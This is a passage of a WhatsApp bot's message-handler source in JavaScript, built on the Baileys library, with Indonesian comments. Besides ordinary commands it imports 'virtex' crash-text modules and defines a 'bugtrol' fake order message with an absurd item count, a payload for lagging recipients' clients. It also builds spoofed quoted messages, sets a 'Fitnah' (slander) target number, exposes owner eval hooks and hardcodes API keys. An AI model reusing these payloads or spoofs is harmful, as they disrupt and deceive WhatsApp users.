// [❗] HW MODS WA
// [❗] MAU REMOD YAH
// [❗] HAHAHAHAHAHA :)
const
{
WAConnection: _WAConnection,
MessageType,
Presence,
MessageOptions,
Mimetype,
MimetypeMap,
WALocationMessage,
ChatModification,
WA_MESSAGE_STUB_TYMap,
WA_DEFAULT_EPHEMERAL,
ReconnectMode,
ProxyAgent,
GroupSettingChange,
waChatKey,
mentionedJid,
processTime
} = require("@adiwajshing/baileys")
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const cheerio = require("cheerio");
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const fsx = require("fs-extra")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const ig = require('insta-fetcher')
const hx = require('hxz-api')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const { pinterest } = require('./lib/pinterest')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const imgbb = require('imgbb-uploader')
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const util = require('util')
const mathjs = require('mathjs')
const toHur = require('@develoka/angka-terbilang-js')
const ph = require('./lib/photooxy.js')
// const fk = require('./lib/fakereply.js')
const { jadibot, stopjadibot } = require('./jadibot.js')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./database/off.json'))
const { emoji2 } = require('./database/emoji2')
const { virtext } = require('./database/virtext')
const { virtex, vipi } = require('./lib/virtex.js')
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const ntilink = JSON.parse(fs.readFileSync("./database/antilink.json"))
const setTtt = require('./lib/tictactoe.js')
const Mthumb = fs.readFileSync('./media/image/thumb.jpeg')
const Mfake = fs.readFileSync ('./media/image/fake.jpeg')
const Bthumb = fs.readFileSync('./media/image/thumb.jpeg','base64')
const Bfake = fs.readFileSync ('./media/image/fake.jpeg','base64')
const _win = JSON.parse(fs.readFileSync('./database/tttwin.json'))
const _lose = JSON.parse(fs.readFileSync('./database/tttlose.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
// SETTING // === // HW MODS WA // === // HAIKAL // === // HAIKALMODS //
banChats = true // Self and Public ( HW MODS WA )
bugc = true // Antibug Gc ( HW MODS WA & HAIKALMODS )
antitrol = true // Antifake Trolli ( HW MODS WA )
offline = false // Offline and Online ( HAIKAL )
multi = true // Multi Prefix ( HW MODS WA )
antitags = true // Antitag ( HW MODS WA )
readG = true // Auto Read Group ( HW MODS WA )
readP = false // Auto Read Private ( HW MODS WA )
winawal = 1 // Win Tictactoe ( HW MODS WA )
loseawal = 1 // Lose Tictactoe ( HW MODS WA )
memberwin = 1 // Win ( HW MODS WA )
memberlose = 1 // Lose ( HW MODS WA )
pref = '?' // Prefix ( HW MODS WA )
targetpc = '6285714170944' // Fitnah Target ( HAIKAL )
owner = '6285714170944' // Numbers Owner ( HW MODS WA )
ownerNumbers = ["6285714170944@s.whatsapp.net","6285714170944@s.whatsapp.net","6285714170944@s.whatsapp.net"]
linkcom = ".com" // Anti Link ( HW MODS WA )
linkid = ".id" // Anti Link ( HW MODS WA )
linkxyz = ".xyz" // Anti Link ( HW MODS WA )
linkly = ".ly" // Anti Link ( HW MODS WA )
linkhttp = "http" // Anti Link ( HW MODS WA )
linkwa = "://chat.whatsapp.com" // Anti Link Group Whatsapp ( HW MODS WA )
deflt = "..........c.....com" // Default Link ( HW MODS WA )
linknye = `${deflt}` // Anti Link ( HW MODS WA )
fake = 'HW MODS WA' // Fake Text Reply / Name Bot ( HW MODS WA )
a = '```' // Font Whatsapp ( HW MODS WA )
bailver = '3.5.1' // Versi Baileys ( HW MODS WA )
botver = '1.0.0' // Versi Bot ( HW MODS WA )
numbernye = '0' // Whatsapp Numbers ( HAIKAL )
waktu = '-' // Waktu Fiturs Online / Offline ( HAIKAL )
alasan = '-' // Alasan Fiturs Online / Offline ( HAIKAL )
ownerNumber = [`${owner}@s.whatsapp.net`] // Numbers Owner ( HAIKAL )
const X = "❌" // Tictactoe ( HW MODS WA & Lolhuman )
const O = "⭕️" // Tictactoe ( HW MODS WA & Lolhuman )
const tunjuk = "👈" // Tictactoe ( HW MODS WA & Lolhuman )
lolkey = 'DELLASGANTENG' //Lolhuman
xteam = 'edd4e2b682326371'
HunterApi = 'ikygans'
lolhuman = 'lolhuman'
//=================================================//
const getWins = (sender, total) => {
            let position = false
            Object.keys(_win).forEach((i) => {
                if (_win[i].jid === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _win[position].win -= total
                 fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
            }
        }
 
const getLose = (sender, total) => {
            let position = false
            Object.keys(_lose).forEach((i) => {
                if (_lose[i].jid === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _lose[position].lose -= total
                 fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
            }
        }
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
                                         }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
                                         }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
                                         }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
                                         }
//=================================================//
module.exports = Haikal = async (Haikal, mek) => {
	try {
if (!mek.hasNewMessage) return
mek = mek.messages.all()[0]
if (!mek.message) return
if (mek.key && mek.key.remoteJid == 'status@broadcast') return
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (mek.key.fromMe) return
nums = mek.participant
longkapnye = "\n".repeat(420)
tekuss = `© HW MODS WA 2021${longkapnye}\`\`\`BUGGC TERDETEKSI\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by HW MODS_\n*Jangan maen bug tod*`
Haikal.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
Haikal.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
Haikal.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}
                global.blocked
                m = simple.smsg(Haikal, mek)
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        	const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeJak = moment.tz('Asia/Jakarta').format("HH:mm:ss");
		const timeMak = moment().tz('Asia/Makassar').format("HH:mm:ss");
        const timeJay = moment().tz('Asia/Jayapura').format("HH:mm:ss");
                const type = Object.keys(mek.message)[0]        
                const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
                if (multi){
                   // var prefix = ''
                   var prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        	    } else {
        	    prefix = pref
        	    }
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
	//	 const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
        const q = args.join(' ')
        const timestamp = speed();
        const latensi = speed() - timestamp
		const run = process.uptime()
		const botNumber = Haikal.user.jid
		const botNumberss = Haikal.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0]
		// const isSelfNumber = config.NomorSELF
		// const isOwner = sender.id === isSelfNumber
                const isOwner = ownerNumbers.includes(sender)
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = Haikal.user.phone
		const totalchat = await Haikal.chats.all()
		const totalgroup = await Haikal.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await Haikal.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
	    const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const isStcVideo = isStcMedia && content.includes("videoMessage")
	    const isStcImage = isStcMedia && content.includes("imageMessage")
	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
		const groupMetadata = isGroup ? await Haikal.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const AntiLink = isGroup ? ntilink.includes(from) : false
        const conts = mek.key.fromMe ? Haikal.user.jid : Haikal.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? Haikal.user.name : conts.notify || conts.vname || conts.name || '-'
        const atibot = m.isBaileys
// Message ( HW MODS WA )
const mess = {
   "wait": "```⊷️「 Wait 」```",
   "success": "```⊷️「 Success 」```",
   "wrongFormat": "```⊷️「 Format is wrong 」```",
   "error": {
       "stick": "```⊷️「 Sticker Only 」```",
       "lv": "```⊷️「 Error 」```",
       "api": "```⊷️「 Error 」```"
   },
   "only": {
       "group": "```⊷️「 Group Only 」```",
       "pribadi": "```⊷️「 Private Only 」```"
   }
}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            Haikal.sendMessage(from, teks, text, {quoted:mek})
        }
        
        const freply = (teks) => {
            Haikal.sendMessage(from, teks, text, {quoted:mek, contextInfo:{"externalAdReply":{"title": fake,"body": `Subscribe HW MODS WA`,"previewType": "PHOTO","thumbnailUrl": `https://cdn.pixabay.com/photo/2021/07/21/14/42/indonesian-6483193_640.jpg`,"thumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),"sourceUrl": `https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g/`}}})
        }

        const sendMess = (hehe, teks) => {
            Haikal.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? Haikal.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Haikal.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }        
        const fakestatus = (teks) => {
            Haikal.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": Mthumb,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            Haikal.sendMessage(from, teks, image, {thumbnail:Mfake,quoted:mek,caption:yes})
        }
        const fekemek = (teks, yes) => {
            Haikal.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./stik/deden.jpeg'),quoted:mek,caption:yes})
        }         
        const fakegroup = (teks) => {
            Haikal.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": Mthumb,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        
        const bugtrol = { 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6285714170944@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": 1000000000000,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": "*HW MODS WA*",
						"orderTitle": "HAIKAL",
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}
			    
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './database/sampah' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './database/sampah' + names + '.png'
                    let asw = './database/sampah' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Haikal.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
// Fake Link ( HW MODS WA )
const flink = {
"title": fake,
"body": `Subscribe HW MODS WA`,
"previewType": "PHOTO",
"thumbnailUrl": `https://cdn.pixabay.com/photo/2021/07/21/14/42/indonesian-6483193_640.jpg`,
"thumbnail": Mthumb,
"sourceUrl": `https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g`
}
// Dari docs baileys ( HW MODS WA )
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
// {buttonId: 'id1', buttonText: {displayText: 'Button 1'}, type: 1},
// {buttonId: 'id2', buttonText: {displayText: 'Button 2'}, type: 1}
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
Haikal.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
// Nge Eval Terus Gw Sempurnain ( HW MODS WA & Rashid & Ra & HAIKALz )
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Haikal.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
Haikal.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
// Pahamin dari function sendbutimage terus ini cuman gw bedain type ( HAIKAL & Rashid & HAIKALz )
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await Haikal.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
Haikal.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
// ANTI LINK ( HW MODS WA )
if (budy.includes(linknye)) {
if (!isGroup) return
if (!AntiLink) return
if (isGroupAdmins) return reply('Admin Bebas')
if (mek.key.fromMe) return reply('Owner Bebas')
if (isOwner) return reply('Owner Bebas')
kice = sender
Haikal.groupRemove(mek.key.remoteJid, [kice]).catch((e) => { reply(`*ERR:* ${e}`) })
Haikal.sendMessage(from, `\`\`\`「 Detect Link 」\`\`\`\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, MessageType.text, {contextInfo:{mentionedJid:[kice]}})
}
// ANTITROLLI
if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitrol === false) return
if (mek.key.fromMe) return
reply('Njier jangan pake fake trolli _-\n\n' + require('util').format(m.key))
await Haikal.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Haikal.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }            				
//AutoVn
if (budy.startsWith('Assalamualaikum')){
const assalamualaikum = fs.readFileSync('media/assalamualaikum.mp3')
                    Haikal.sendMessage(from, assalamualaikum, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
if (budy.startsWith('Hore')){
const keren = fs.readFileSync('media/keren.mp3')
                    Haikal.sendMessage(from, keren, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
if (budy.startsWith('BENAR')){
const keren = fs.readFileSync('media/keren.mp3')
                    Haikal.sendMessage(from, keren, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
    if (budy.startsWith('Apa')){
const apa = fs.readFileSync('media/apa.mp3')
                    Haikal.sendMessage(from, apa, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Apaan')){
const apaan = fs.readFileSync('media/apaan.mp3')
                    Haikal.sendMessage(from, apaan, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }                   
                    if (budy.startsWith('Hantam')){
const hantam = fs.readFileSync('media/hantam.mp3')
                    Haikal.sendMessage(from, hantam, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Hapus')){
const hapus = fs.readFileSync('media/hapus.mp3')
                    Haikal.sendMessage(from, hapus, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Asw')){
const asw = fs.readFileSync('media/asw.mp3')
                    Haikal.sendMessage(from, asw, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Kasian')){
const kasian = fs.readFileSync('media/kasian.mp3')
                    Haikal.sendMessage(from, kasian, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Keren')){
const keren = fs.readFileSync('media/keren.mp3')
                    Haikal.sendMessage(from, keren, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Kesel')){
const kesel = fs.readFileSync('media/kesel.mp3')
                    Haikal.sendMessage(from, kesel, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Ketawa')){
const ketawa = fs.readFileSync('media/ketawa.mp3')
                    Haikal.sendMessage(from, ketawa, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Loli')){
const loli = fs.readFileSync('media/loli.mp3')
                    Haikal.sendMessage(from, loli, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Mastah')){
const mastah = fs.readFileSync('media/mastah.mp3')
                    Haikal.sendMessage(from, mastah, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Ngeselin')){
const ngeselin = fs.readFileSync('media/ngeselin.mp3')
                    Haikal.sendMessage(from, ngeselin, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Nob')){
const nob = fs.readFileSync('media/nob.mp3')
                    Haikal.sendMessage(from, nob, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Awkwk')){
const awkwk = fs.readFileSync('media/awkwk.mp3')
                    Haikal.sendMessage(from, awkwk, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Nub')){
const nub = fs.readFileSync('media/nub.mp3')
                    Haikal.sendMessage(from, nub, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }
                    if (budy.startsWith('Sedih')){
const sedih = fs.readFileSync('media/sedih.mp3')
                    Haikal.sendMessage(from, sedih, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    }			
                    // Eval ( HAIKAL )
if (budy.startsWith('>')){
if (!mek.key.fromMe && !isOwner) return
try {
return Haikal.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
// Eval Async ( HW MODS WA & Franky )
if (budy.startsWith('=>')){
if (!isOwner && !mek.key.fromMe) return
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
//FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            Haikal.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': Mthumb}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        Haikal.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': Mthumb}}}})
          }
        }
            }
          }
        }
      }
    }
// Auto Read Group ( HW MODS WA )
var chats = await Haikal.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readG === false) return
await Haikal.chatRead(jid)
})
// Auto Read Private ( HW MODS WA )
var chatss = await Haikal.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readP === false) return
await Haikal.chatRead(jid)
})
var prefi = pref
			
if (multi) {
    prefi = `Multi-Prefix`
}
// function for get the winner
const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
